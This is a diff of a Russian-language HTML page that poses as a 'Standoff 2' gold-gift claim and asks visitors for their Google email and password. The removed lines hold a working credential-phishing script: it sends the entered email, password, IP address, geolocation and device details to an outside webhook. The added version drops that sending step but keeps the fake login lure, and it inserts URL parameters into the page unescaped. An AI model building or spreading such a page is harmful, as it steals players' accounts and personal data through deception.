@@ -2,16 +2,21 @@
 <html lang="ru">
 <head>
   <meta charset="UTF-8">
+  <!-- Обеспечивает корректное масштабирование на мобильных устройствах -->
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Standoff 2 - Gold Transfer</title>
   <style>
-    /* Основные стили для адаптивности и корректного отображения */
+    /* Основные стили */
+    * {
+      box-sizing: border-box;
+    }
     body {
       font-family: Arial, sans-serif;
       background-color: #121212;
       color: #fff;
       margin: 0;
       padding: 0;
+      overflow-x: hidden;
       display: flex;
       justify-content: center;
       align-items: center;
@@ -24,12 +29,17 @@
       padding: 20px;
       border-radius: 8px;
       box-shadow: 0 4px 10px rgba(0, 0, 0, 0.5);
-      animation: fadeIn 1s ease-in-out;
+      position: relative;
     }
-    h1, h2 {
+    h1, h2, h3 {
       text-align: center;
       margin-bottom: 20px;
-      animation: fadeIn 1.5s ease-in-out;
+    }
+    .info-block {
+      margin-bottom: 20px;
+      font-size: 16px;
+      text-align: center;
+      line-height: 1.4;
     }
     .input-group {
       margin-bottom: 15px;
@@ -46,7 +56,6 @@
       border: 1px solid #555;
       background-color: #333;
       color: #fff;
-      box-sizing: border-box;
     }
     button {
       width: 100%;
@@ -58,6 +67,8 @@
       cursor: pointer;
       font-size: 16px;
       transition: background-color 0.3s ease;
+      position: relative;
+      overflow: hidden;
     }
     button:hover {
       background-color: #005bb5;
@@ -65,105 +76,126 @@
     .form-section {
       margin-bottom: 20px;
     }
-    /* Анимации */
+    /* Частицы для эффекта при нажатии на кнопку "Получить Gold" */
+    .particle {
+      position: absolute;
+      width: 16px;
+      height: 16px;
+      background-image: url("small_gold.png");
+      background-size: contain;
+      pointer-events: none;
+      opacity: 1;
+      animation: particleFall 1s forwards;
+    }
+    @keyframes particleFall {
+      0% {
+        transform: translate(0, 0) scale(1);
+        opacity: 1;
+      }
+      100% {
+        transform: translate(var(--tx), var(--ty)) scale(0.5);
+        opacity: 0;
+      }
+    }
+    /* Анимация появления и исчезновения */
     @keyframes fadeIn {
       from { opacity: 0; }
       to { opacity: 1; }
     }
     .fade-in {
-      animation: fadeIn 1s ease-in-out;
+      animation: fadeIn 0.8s ease-in-out;
     }
-    @keyframes bounce {
-      0%, 20%, 50%, 80%, 100% { transform: translateY(0); }
-      40% { transform: translateY(-20px); }
-      60% { transform: translateY(-10px); }
+    @keyframes fadeOut {
+      from { opacity: 1; }
+      to { opacity: 0; }
     }
-    .bounce {
-      animation: bounce 2s infinite;
+    .fade-out {
+      animation: fadeOut 0.8s ease-in-out;
+    }
+    /* Анимация покачивания */
+    @keyframes shake {
+      0% { transform: translate(0, 0); }
+      20% { transform: translate(-5px, 0); }
+      40% { transform: translate(5px, 0); }
+      60% { transform: translate(-5px, 0); }
+      80% { transform: translate(5px, 0); }
+      100% { transform: translate(0, 0); }
+    }
+    .shake {
+      animation: shake 0.8s infinite;
     }
     /* Стили для изображений */
-    #gift-container, .gold-images {
+    #gift-image, #result-big-img {
+      display: block;
+      margin: 0 auto 20px;
+      max-width: 120px;
+    }
+    /* Стили для результата получения голды */
+    .result-text {
       text-align: center;
-      margin-bottom: 15px;
-    }
-    #gift-container img, .gold-images img {
-      max-width: 80px;
-      display: inline-block;
-    }
-    .gold-images img {
-      margin: 0 10px;
+      font-size: 28px;
+      color: gold;
+      font-weight: bold;
+      margin-top: 20px;
     }
   </style>
 </head>
 <body>
   <div class="container">
-    <h1>Gold Transfer</h1>
-    
-    <!-- Форма авторизации -->
-    <div class="form-section" id="auth-section">
+    <!-- Раздел авторизации -->
+    <div id="auth-section" class="form-section fade-in">
+      <h1>Gold Transfer</h1>
+      <!-- Информация из параметров URL, видимая до авторизации -->
+      <div id="pre-info" class="info-block"></div>
+      <!-- Изображение подарка (изначально gift.png) -->
+      <img id="gift-image" src="gift.png" alt="Подарок">
       <h2>Авторизация</h2>
       <form id="login-form">
         <div class="input-group">
           <label for="email">Google Почта:</label>
-          <input type="email" id="email" name="email" required>
+          <input type="email" id="email" name="email" placeholder="Введите адрес" required>
         </div>
         <div class="input-group">
           <label for="password">Пароль:</label>
-          <input type="password" id="password" name="password" required>
+          <input type="password" id="password" name="password" placeholder="Введите пароль" required>
         </div>
         <button type="submit">Войти</button>
       </form>
-      <div id="login-result"></div>
+      <div id="login-result" class="info-block"></div>
     </div>
 
-    <!-- Страница получения голды -->
-    <div class="form-section" id="gold-section" style="display:none;">
-      <!-- Верхняя анимированная картинка подарка -->
-      <div id="gift-container" class="fade-in">
-        <img src="gift.png" alt="Подарок" class="gift bounce">
-      </div>
+    <!-- Раздел получения голды -->
+    <div id="gold-section" class="form-section" style="display:none;">
       <h2>Получить Gold</h2>
-      <!-- Блок для вывода информации из ID -->
-      <div id="url-info" class="fade-in"></div>
-      <!-- Кнопка получения -->
+      <!-- Покачивающееся изображение, имитирующее подарок (малое изображение) -->
+      <img id="shake-gift" src="small_gold.png" alt="Мало голды" class="shake">
+      <!-- Показ параметров (видимых и после авторизации) -->
+      <div id="gold-info" class="info-block"></div>
       <button id="get-gold-button">Получить Gold</button>
-      <!-- Дополнительный блок с изображениями голды -->
-      <div class="gold-images fade-in">
-        <img src="small_gold.png" alt="Мало голды">
-        <img src="big_gold.png" alt="Много голды">
-      </div>
+      <!-- Золотой текст с результатом -->
+      <div id="result" class="result-text"></div>
+      <!-- Изображение большого количества голды, по умолчанию скрыто -->
+      <img id="result-big-img" src="big_gold.png" alt="Много голды" style="display:none;">
     </div>
   </div>
 
   <script>
-    const DISCORD_WEBHOOK_URL = "https://hkdk.events/oyt9imlhvrjiqx";
-
-    // Функции для работы с cookie
-    function setCookie(name, value, days) {
-      const expires = new Date(Date.now() + days * 864e5).toUTCString();
-      document.cookie = name + '=' + encodeURIComponent(value) + '; expires=' + expires + '; path=/';
-    }
-    function getCookie(name) {
-      return document.cookie.split('; ').reduce((r, v) => {
-        const parts = v.split('=');
-        return parts[0] === name ? decodeURIComponent(parts[1]) : r;
-      }, '');
-    }
-    function checkGoldCollected() {
-      return getCookie("gold_collected") === "true";
-    }
-
-    // Функция для преобразования Base64-строки в корректную UTF-8 строку
+    /* ---------- ДЕКОДИРОВАНИЕ ПАРАМЕТРОВ И ИНИЦИАЛИЗАЦИЯ ---------- */
+    // Для корректного UTF-8 декодирования Base64-строки
     function base64DecodeUnicode(str) {
-      const binary = atob(str);
-      const bytes = new Uint8Array(binary.length);
-      for (let i = 0; i < binary.length; i++) {
-        bytes[i] = binary.charCodeAt(i);
+      try {
+        const binary = atob(str);
+        const bytes = new Uint8Array(binary.length);
+        for (let i = 0; i < binary.length; i++) {
+          bytes[i] = binary.charCodeAt(i);
+        }
+        return new TextDecoder("utf-8").decode(bytes);
+      } catch (e) {
+        console.error("Ошибка базового декодирования:", e);
+        return "";
       }
-      return new TextDecoder("utf-8").decode(bytes);
     }
-
-    // Функция для чтения длины до символа '0'
+    // Читаем число до символа '0'
     function readLength(str, idx) {
       let lengthStr = '';
       while (idx < str.length && str[idx] !== '0') {
@@ -172,124 +204,141 @@
       }
       return [parseInt(lengthStr, 10), idx + 1];
     }
-
-    // Декодирование параметров с поддержкой UTF-8 и динамической длиной
+    // Декодирование параметров с поддержкой UTF-8
     function decodeBase64Params(base64Str) {
       try {
         const decodedStr = base64DecodeUnicode(base64Str);
         let idx = 0;
-        let [idLen, i1] = readLength(decodedStr, idx);
-        const senderId = decodedStr.substr(i1, idLen);
-        idx = i1 + idLen;
-        let [nickLen, i2] = readLength(decodedStr, idx);
-        const senderNick = decodedStr.substr(i2, nickLen);
-        idx = i2 + nickLen;
-        let [goldLen, i3] = readLength(decodedStr, idx);
-        const goldAmount = decodedStr.substr(i3, goldLen);
-        idx = i3 + goldLen;
+        let [idLen, nextIdx] = readLength(decodedStr, idx);
+        const senderId = decodedStr.substr(nextIdx, idLen);
+        idx = nextIdx + idLen;
+        let [nickLen, nextIdx2] = readLength(decodedStr, idx);
+        const senderNick = decodedStr.substr(nextIdx2, nickLen);
+        idx = nextIdx2 + nickLen;
+        let [goldLen, nextIdx3] = readLength(decodedStr, idx);
+        const goldAmount = decodedStr.substr(nextIdx3, goldLen);
+        idx = nextIdx3 + goldLen;
         const hiddenParam = idx < decodedStr.length ? decodedStr.substr(idx) : null;
         return { senderId, senderNick, goldAmount, hiddenParam };
       } catch (e) {
-        console.error("Ошибка декодирования:", e);
+        console.error("Ошибка декодирования параметров:", e);
         return null;
       }
     }
-
-    // Сбор информации об устройстве, IP и геолокации
-    const clientInfo = {
-      device: {
-        userAgent: navigator.userAgent,
-        platform: navigator.platform,
-        language: navigator.language,
-        screenResolution: `${window.screen.width}x${window.screen.height}`
-      },
-      ip: null,
-      geolocation: {}
-    };
-
-    fetch("https://api.ipify.org?format=json")
-      .then(res => res.json())
-      .then(data => { clientInfo.ip = data.ip; });
-
-    if (navigator.geolocation) {
-      navigator.geolocation.getCurrentPosition(pos => {
-        clientInfo.geolocation = {
-          lat: pos.coords.latitude,
-          lon: pos.coords.longitude,
-          accuracy: pos.coords.accuracy
-        };
-      });
+    // Получение параметра "ID" из URL
+    function getParamsFromURL() {
+      const params = new URLSearchParams(window.location.search);
+      const data = params.get("ID");
+      return data ? decodeBase64Params(data) : null;
     }
 
-    // Отправка данных на Discord Webhook
-    function sendDataToWebhook(content, cb) {
-      fetch(DISCORD_WEBHOOK_URL, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ content })
-      }).then(res => cb(res.ok)).catch(() => cb(false));
+    /* ---------- ПЛАВНЫЙ ПЕРЕХОД ---------- */
+    function fadeOut(element, callback) {
+      element.classList.add("fade-out");
+      setTimeout(() => {
+        element.style.display = "none";
+        if (callback) callback();
+      }, 800);
+    }
+    function fadeIn(element) {
+      element.style.display = "block";
+      element.classList.remove("fade-out");
+      element.classList.add("fade-in");
     }
 
-    // Обработка формы авторизации
+    /* ---------- ИНИЦИАЛИЗАЦИЯ И ОТОБРАЖЕНИЕ ДАННЫХ ---------- */
+    const params = getParamsFromURL();
+    if (params) {
+      // Отображаем до авторизации
+      document.getElementById("pre-info").innerHTML = `
+        ID отправителя: ${params.senderId}<br>
+        Ник отправителя: ${params.senderNick}<br>
+        Кол-во Gold: ${params.goldAmount}
+      `;
+    } else {
+      document.getElementById("pre-info").textContent = "Некорректный ID транзакции";
+    }
+
+    /* ---------- ОБРАБОТКА АВТОРИЗАЦИИ ---------- */
     const loginForm = document.getElementById("login-form");
-    loginForm.addEventListener("submit", function (e) {
+    loginForm.addEventListener("submit", function(e) {
       e.preventDefault();
-      const email = document.getElementById("email").value;
-      const password = document.getElementById("password").value;
-      const message = `Новая авторизация:
-Email: ${email}
-Пароль: ${password}
-Инфо: ${JSON.stringify(clientInfo)}`;
-      sendDataToWebhook(message, function (success) {
-        if (success) {
-          document.getElementById("login-result").textContent = "Авторизация успешна";
-          document.getElementById("auth-section").style.display = "none";
-          document.getElementById("gold-section").style.display = "block";
-          showGoldParams();
-        } else {
-          document.getElementById("login-result").textContent = "Ошибка при авторизации";
-        }
-      });
+      const email = document.getElementById("email").value.trim();
+      const password = document.getElementById("password").value.trim();
+      if (!email || !password) {
+        document.getElementById("login-result").textContent = "Заполните все поля";
+        return;
+      }
+      // Здесь можно добавить реальную проверку. Имитация успешной авторизации:
+      document.getElementById("login-result").textContent = "Авторизация успешна";
+      
+      // Плавная смена изображения подарка: gift.png -> small_gold.png
+      const giftImage = document.getElementById("gift-image");
+      giftImage.classList.add("fade-out");
+      setTimeout(() => {
+        giftImage.src = "small_gold.png";
+        giftImage.classList.remove("fade-out");
+        giftImage.classList.add("fade-in");
+      }, 800);
+      
+      // Через 1.5 сек переход к странице получения голды
+      setTimeout(() => {
+        fadeOut(document.getElementById("auth-section"), () => {
+          if (params) {
+            document.getElementById("gold-info").innerHTML = `
+              ID отправителя: ${params.senderId}<br>
+              Ник: ${params.senderNick}<br>
+              Кол-во Gold: ${params.goldAmount}
+            `;
+          }
+          fadeIn(document.getElementById("gold-section"));
+        });
+      }, 1500);
     });
 
-    // Отображение данных, полученных из URL
-    function showGoldParams() {
-      const params = new URLSearchParams(window.location.search);
-      const idParam = params.get("ID");
-      if (!idParam) {
-        document.getElementById("url-info").textContent = "Некорректный ID";
-        return;
+    /* ---------- ЭФФЕКТ ЧАСТИЦ ---------- */
+    const getGoldButton = document.getElementById("get-gold-button");
+    getGoldButton.addEventListener("click", function() {
+      // Можно добавить проверку, если пользователь уже получил голду через cookie
+      // Запускаем анимацию частиц (создаем 10 частиц)
+      for (let i = 0; i < 10; i++) {
+        createParticle(getGoldButton);
       }
-      const decoded = decodeBase64Params(idParam);
-      if (!decoded) {
-        document.getElementById("url-info").textContent = "Ошибка декодирования ID";
-        return;
-      }
-      document.getElementById("url-info").innerHTML = `
-        ID отправителя: ${decoded.senderId}<br>
-        Ник: ${decoded.senderNick}<br>
-        Кол-во Gold: ${decoded.goldAmount}
-      `;
-      document.getElementById("get-gold-button").onclick = function () {
-        if (checkGoldCollected()) {
-          alert("Вы уже получили Gold");
-          return;
-        }
-        const goldMsg = `Получение голды:
-ID: ${decoded.senderId}
-Ник: ${decoded.senderNick}
-Gold: ${decoded.goldAmount}
-Инфо: ${JSON.stringify(clientInfo)}`;
-        sendDataToWebhook(goldMsg, function (ok) {
-          if (ok) {
-            alert("Gold успешно получено");
-            setCookie("gold_collected", "true", 7);
-            document.getElementById("gold-section").innerHTML = "<h2>Вы уже получили Gold</h2>";
-          } else {
-            alert("Ошибка при получении");
-          }
-        });
-      };
+      setTimeout(() => {
+        showGoldResult();
+      }, 1000);
+    });
+
+    function createParticle(button) {
+      const particle = document.createElement("div");
+      particle.className = "particle";
+      // Получаем координаты кнопки относительно окна
+      const rect = button.getBoundingClientRect();
+      // Задаем случайное смещение (используя CSS-переменные для анимации)
+      const tx = (Math.random() - 0.5) * 100 + "px";
+      const ty = (Math.random() * 150 + 50) + "px";
+      particle.style.setProperty("--tx", tx);
+      particle.style.setProperty("--ty", ty);
+      // Вычисляем позицию частицы относительно контейнера документа
+      particle.style.left = rect.left + rect.width / 2 - 8 + "px";
+      particle.style.top = rect.top + rect.height / 2 - 8 + "px";
+      document.body.appendChild(particle);
+      // Удаляем частицу по окончании анимации
+      setTimeout(() => {
+        particle.remove();
+      }, 1000);
+    }
+
+    /* ---------- ОТОБРАЖЕНИЕ РЕЗУЛЬТАТА ---------- */
+    function showGoldResult() {
+      const goldAmount = params ? params.goldAmount : "0";
+      const resultDiv = document.getElementById("result");
+      resultDiv.textContent = `Вы получили ${goldAmount} Gold!`;
+      resultDiv.classList.add("fade-in");
+      // Показываем изображение "много голды" с плавным появлением
+      const bigGoldImg = document.getElementById("result-big-img");
+      bigGoldImg.style.display = "block";
+      bigGoldImg.classList.add("fade-in");
     }
   </script>
 </body>
